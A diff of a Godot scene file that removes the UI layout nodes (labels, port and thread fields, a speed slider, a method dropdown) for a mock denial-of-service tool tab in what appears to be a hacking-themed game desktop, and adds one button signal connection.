-metadata/_edit_use_anchors_ = true
-
-[node name="HTTP Subtitle" type="Panel" parent="Desktop/WindowContainer/TabContainer/DOS_APPLICATION/Body/Attack Option"]
-layout_mode = 1
-anchors_preset = -1
-anchor_left = 0.2
-anchor_top = 0.251908
-anchor_right = 0.555556
-anchor_bottom = 0.435115
-theme_override_styles/panel = SubResource("StyleBoxFlat_1pyr5")
-metadata/_edit_use_anchors_ = true
-
-[node name="TCP UDP" type="Panel" parent="Desktop/WindowContainer/TabContainer/DOS_APPLICATION/Body/Attack Option"]
-layout_mode = 1
-anchors_preset = -1
-anchor_left = 0.614815
-anchor_top = 0.251908
-anchor_right = 0.97037
-anchor_bottom = 0.435115
-theme_override_styles/panel = SubResource("StyleBoxFlat_1pyr5")
-metadata/_edit_use_anchors_ = true
-
-[node name="Timeout Label" type="Label" parent="Desktop/WindowContainer/TabContainer/DOS_APPLICATION/Body/Attack Option"]
-layout_mode = 0
-anchor_left = 0.0518337
-anchor_top = 0.0622573
-anchor_right = 0.112019
-anchor_bottom = 0.23783
-theme_override_colors/font_color = Color(0.503132, 0.772753, 0.908336, 1)
-text = "Timeout"
-metadata/_edit_use_anchors_ = true
-
-[node name="HTTP Subtitle Label" type="Label" parent="Desktop/WindowContainer/TabContainer/DOS_APPLICATION/Body/Attack Option"]
-layout_mode = 1
-anchors_preset = -1
-anchor_left = 0.325926
-anchor_top = 0.0610687
-anchor_right = 0.42963
-anchor_bottom = 0.236641
-theme_override_colors/font_color = Color(0.503132, 0.772753, 0.908336, 1)
-text = "HTTP Subtitle"
-metadata/_edit_use_anchors_ = true
-
-[node name="HTTP Subtitle Label2" type="Label" parent="Desktop/WindowContainer/TabContainer/DOS_APPLICATION/Body/Attack Option"]
-layout_mode = 1
-anchors_preset = -1
-anchor_left = 0.718267
-anchor_top = 0.0622573
-anchor_right = 0.866415
-anchor_bottom = 0.23783
-offset_right = -6.10352e-05
-theme_override_colors/font_color = Color(0.503132, 0.772753, 0.908336, 1)
-text = "TCP / UDP message"
-metadata/_edit_use_anchors_ = true
-
-[node name="Port" type="Panel" parent="Desktop/WindowContainer/TabContainer/DOS_APPLICATION/Body/Attack Option"]
-layout_mode = 1
-anchors_preset = -1
-anchor_left = 0.0222222
-anchor_top = 0.687023
-anchor_right = 0.17037
-anchor_bottom = 0.870229
-theme_override_styles/panel = SubResource("StyleBoxFlat_1pyr5")
-metadata/_edit_use_anchors_ = true
-
-[node name="Method" type="OptionButton" parent="Desktop/WindowContainer/TabContainer/DOS_APPLICATION/Body/Attack Option"]
-layout_mode = 1
-anchors_preset = -1
-anchor_left = 0.18512
-anchor_top = 0.684828
-anchor_right = 0.333269
-anchor_bottom = 0.890934
-offset_right = -3.05176e-05
-offset_bottom = -3.0
-theme_override_styles/normal = SubResource("StyleBoxFlat_y56x2")
-alignment = 2
-item_count = 6
-popup/item_0/text = " TCP"
-popup/item_0/id = 1
-popup/item_1/text = "UDP"
-popup/item_1/id = 2
-popup/item_2/text = "HTTP"
-popup/item_2/id = 3
-popup/item_3/text = "ReCol"
-popup/item_3/id = 4
-popup/item_4/text = "slowLOIC"
-popup/item_4/id = 5
-popup/item_5/text = "ICMP"
-popup/item_5/id = 6
-metadata/_edit_use_anchors_ = true
-
-[node name="Threads" type="Panel" parent="Desktop/WindowContainer/TabContainer/DOS_APPLICATION/Body/Attack Option"]
-layout_mode = 1
-anchors_preset = -1
-anchor_left = 0.348026
-anchor_top = 0.684828
-anchor_right = 0.496174
-anchor_bottom = 0.868034
-theme_override_styles/panel = SubResource("StyleBoxFlat_1pyr5")
-metadata/_edit_use_anchors_ = true
-
-[node name="Wait for reply" type="CheckBox" parent="Desktop/WindowContainer/TabContainer/DOS_APPLICATION/Body/Attack Option"]
-layout_mode = 0
-anchor_left = 0.503704
-anchor_top = 0.687023
-anchor_right = 0.62963
-anchor_bottom = 0.89313
-theme_override_colors/font_color = Color(0.482353, 0.741176, 0.87451, 1)
-theme_override_styles/normal = SubResource("StyleBoxFlat_4d7ws")
-text = "Wait for reply"
-metadata/_edit_use_anchors_ = true
-
-[node name="Speed" type="HSlider" parent="Desktop/WindowContainer/TabContainer/DOS_APPLICATION/Body/Attack Option"]
-layout_mode = 0
-anchor_left = 0.637037
-anchor_top = 0.625954
-anchor_right = 0.97037
-anchor_bottom = 0.748092
-step = 10.0
-scrollable = false
-tick_count = 10
-ticks_on_borders = true
-metadata/_edit_use_anchors_ = true
-
-[node name="Port Label" type="Label" parent="Desktop/WindowContainer/TabContainer/DOS_APPLICATION/Body/Attack Option"]
-layout_mode = 1
-anchors_preset = -1
-anchor_left = 0.0592385
-anchor_top = 0.498056
-anchor_right = 0.103683
-anchor_bottom = 0.673629
-theme_override_colors/font_color = Color(0.503132, 0.772753, 0.908336, 1)
-text = "Port"
-horizontal_alignment = 1
-metadata/_edit_use_anchors_ = true
-
-[node name="Methods Label" type="Label" parent="Desktop/WindowContainer/TabContainer/DOS_APPLICATION/Body/Attack Option"]
-layout_mode = 1
-anchors_preset = -1
-anchor_left = 0.207335
-anchor_top = 0.498056
-anchor_right = 0.311039
-anchor_bottom = 0.673629
-theme_override_colors/font_color = Color(0.503132, 0.772753, 0.908336, 1)
-text = "Methods"
-horizontal_alignment = 1
-metadata/_edit_use_anchors_ = true
-
-[node name="Threads Label" type="Label" parent="Desktop/WindowContainer/TabContainer/DOS_APPLICATION/Body/Attack Option"]
-layout_mode = 1
-anchors_preset = -1
-anchor_left = 0.370241
-anchor_top = 0.498056
-anchor_right = 0.473944
-anchor_bottom = 0.673629
-theme_override_colors/font_color = Color(0.503132, 0.772753, 0.908336, 1)
-text = "Threads"
-horizontal_alignment = 1
-metadata/_edit_use_anchors_ = true
-
-[node name="HTTP Subtitle Label3" type="Label" parent="Desktop/WindowContainer/TabContainer/DOS_APPLICATION/Body/Attack Option"]
-layout_mode = 1
-anchors_preset = -1
-anchor_left = 0.696053
-anchor_top = 0.809341
-anchor_right = 0.90346
-anchor_bottom = 0.984914
-theme_override_colors/font_color = Color(0.503132, 0.772753, 0.908336, 1)
-text = "<= faster   Speed   slower =>"
-horizontal_alignment = 1
-metadata/_edit_use_anchors_ = true
-
-[node name="TextEdit" type="TextEdit" parent="Desktop/WindowContainer/TabContainer/DOS_APPLICATION"]
-visible = false
-layout_mode = 1
-anchors_preset = -1
-anchor_left = 0.0996399
-anchor_top = 0.222408
-anchor_right = 0.469388
-anchor_bottom = 0.267559
-offset_bottom = 1.52588e-05
-theme_override_styles/normal = SubResource("StyleBoxFlat_crsjh")
-metadata/_edit_use_anchors_ = true
-
-[editable path="Desktop/Godot_icon"]
-[editable path="Desktop/Text_icon"]
-[editable path="Desktop/Internet"]
-[editable path="Desktop/IDE1"]
-[editable path="Desktop/terminal1"]
-[editable path="Desktop/shellcodetxt"]
-[editable path="Desktop/WindowContainer/shellcode_txt"]
-[editable path="Desktop/WindowContainer/GodotWindow"]
-[editable path="Desktop/WindowContainer/SQLWindow"]
-[editable path="Desktop/WindowContainer/TextWindow"]
+[connection signal="pressed" from="WindowBackground/Window/WindowContents/WindowHeader/Button" to="WindowBackground" method="_on_button_pressed"]
